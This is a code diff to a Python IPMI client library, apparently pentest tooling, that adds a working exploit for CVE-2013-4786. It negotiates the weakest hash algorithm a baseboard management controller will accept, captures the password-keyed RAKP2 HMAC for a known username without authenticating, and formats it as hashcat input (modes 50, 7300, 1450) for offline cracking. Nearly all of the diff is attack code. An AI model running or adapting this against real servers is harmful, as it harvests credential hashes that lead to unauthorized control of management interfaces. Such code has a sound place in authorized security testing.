@@ -48,6 +48,7 @@ from .scapy_ipmi.crypto import (
     md5_auth_code,
     pad_password,
     rakp2_authcode,
+    rakp2_hmac_input,
     rakp3_authcode,
     rakp4_icv,
     straight_pwd_auth_code,
@@ -836,6 +837,96 @@ class Session:
 
         # 5. Set Session Privilege Level over the now-authenticated session.
         self._set_privilege(self.priv)
+
+    # auth_alg -> (cipher suite carrying it, hashcat mode, needs --hex-salt,
+    #              hashcat line puts salt FIRST). Order = crack-cost preference:
+    # MD5 fastest on GPU, then SHA1, then SHA256. Grab tries them in this order
+    # and returns the first the BMC actually establishes.
+    #   -m 7300 (IPMI2 RAKP HMAC-SHA1): "<salt>:<hmac>"
+    #   -m 50   (HMAC-MD5,   key=$pass): "<hmac>:<salt>"  + --hex-salt
+    #   -m 1450 (HMAC-SHA256,key=$pass): "<hmac>:<salt>"  + --hex-salt
+    _RAKP_HASH_ALGOS = [
+        # auth_alg, name,          suite, hc_mode, hex_salt, salt_first
+        (2, "HMAC-MD5",    6,  50,   True,  False),
+        (1, "HMAC-SHA1",   1,  7300, False, True),
+        (3, "HMAC-SHA256", 17, 1450, True,  False),
+    ]
+
+    def grab_rakp_hashes(self, pad_username: bool = False) -> dict:
+        """CVE-2013-4786: capture the password-keyed RAKP2 HMAC without auth.
+
+        The auth algorithm is attacker-chosen in the Open Session Request and
+        sizes the RAKP2 Key Exchange Auth Code (HMAC-MD5=16, SHA1=20,
+        SHA256=32). The BMC sends RAKP2 (with that HMAC) BEFORE we prove
+        anything in RAKP3 — so we negotiate the fastest-cracking algo the BMC
+        will establish (MD5>SHA1>SHA256), send RAKP1 for a valid username,
+        catch RAKP2, and drop. No RAKP3, no password, no session.
+
+        Needs only a valid username (self.username). Returns a dict with the
+        per-algo attempts and, on success, the captured hash + hashcat salt.
+        Confidentiality algo is irrelevant (RAKP2 is pre-encryption)."""
+        attempts, hit = [], None
+        for auth_alg, name, suite, hc_mode, hex_salt, salt_first in self._RAKP_HASH_ALGOS:
+            try:
+                auth_code, salt = self._grab_one_rakp_hash(suite, pad_username)
+            except IPMIError as e:
+                attempts.append({"alg": name, "suite": suite, "ok": False, "error": str(e)})
+                continue
+            attempts.append({"alg": name, "suite": suite, "ok": True})
+            line = (f"{salt.hex()}:{auth_code.hex()}" if salt_first
+                    else f"{auth_code.hex()}:{salt.hex()}")
+            hit = {
+                "alg": name, "auth_alg": auth_alg, "hc_mode": hc_mode,
+                "hex_salt": hex_salt, "auth_code": auth_code.hex(),
+                "salt": salt.hex(), "line": line,
+                "record": f"{self.username}:{line}",
+            }
+            break
+        return {"host": self.host, "user": self.username,
+                "attempts": attempts, "hash": hit}
+
+    def _grab_one_rakp_hash(self, suite_id: int, pad_username: bool):
+        """One Open Session + RAKP1 with `suite_id`'s auth algo; catch RAKP2 and
+        return (auth_code, salt). Raises IPMIError on rejection. No RAKP3."""
+        import secrets
+        cs = CIPHER_SUITES[suite_id]
+        sid_c = int.from_bytes(secrets.token_bytes(4), "little") or 1
+        rc = secrets.token_bytes(16)
+
+        osr = OpenSessionRequest(
+            msg_tag=0x00, max_priv=0x00, remote_session_id=sid_c,
+            auth_payload=auth_payload(cs.auth_alg),
+            integrity_payload=integrity_payload(cs.integrity_alg),
+            conf_payload=conf_payload(cs.conf_alg),
+        )
+        reply = self._send_lanplus_outside_session(0x10, bytes(osr))
+        if not reply.haslayer(OpenSessionResponse):
+            raise IPMIError("Open Session rejected (no matching cipher suite?)")
+        ores = reply[OpenSessionResponse]
+        if ores.rmcp_status != 0:
+            raise IPMIError(f"Open Session status 0x{ores.rmcp_status:02x}")
+        sid_m = ores.managed_session_id
+
+        uname = self.username.encode("utf-8")
+        if pad_username:                       # iDRAC-quirk targets only
+            uname = uname.ljust(16, b"\x00")
+        role = 0x10 | (self.priv & 0x0F)       # name-only-lookup + max priv
+
+        rakp1 = RAKP1(managed_session_id=sid_m, remote_random=rc,
+                      role=role, user_name=uname)
+        reply = self._send_lanplus_outside_session(0x12, bytes(rakp1))
+        if not reply.haslayer(RAKP2):
+            raise IPMIError("no RAKP2")
+        r2 = reply[RAKP2]
+        if r2.rmcp_status != 0:               # 0x0d = unauthorized name
+            raise IPMIError(f"RAKP2 status 0x{r2.rmcp_status:02x} "
+                            f"(bad username '{self.username}'?)")
+        auth_code = bytes(r2.auth_code)
+        if not auth_code:
+            raise IPMIError("empty auth code (auth algo = none)")
+        salt = rakp2_hmac_input(sid_c, sid_m, rc, bytes(r2.managed_random),
+                                bytes(r2.managed_guid), role, uname)
+        return auth_code, salt
 
     def _send_lanplus_outside_session(self, payload_type: int, payload: bytes):
         """Build & send an unauthenticated RMCP+ control packet (Open/RAKP)."""
